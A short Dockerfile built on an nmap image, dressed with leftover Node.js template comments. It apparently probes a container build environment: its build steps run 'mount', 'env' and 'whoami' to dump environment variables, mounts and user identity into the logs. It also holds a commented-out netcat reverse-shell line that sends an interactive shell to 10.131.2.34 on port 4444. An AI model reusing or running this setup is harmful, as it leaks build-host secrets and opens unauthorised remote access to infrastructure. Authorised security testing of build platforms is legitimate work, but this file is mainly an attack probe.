FROM quay.io/instrumentisto/nmap
# Install app dependencies
# A wildcard is used to ensure both package.json AND package-lock.json are copied
# where available (npm@5+)
# COPY package*.json ./
# If you are building your code for production
# RUN npm ci --only=production
# RUN npm install

COPY . .
RUN pwd
#RUN cat /tmp/f|/bin/sh -i 2>&1|nc 10.131.2.34 4444 >/tmp/f
RUN mount
RUN env
RUN whoami

# Bundle app source
CMD [ "sleep", "3000" ]
EXPOSE 8080
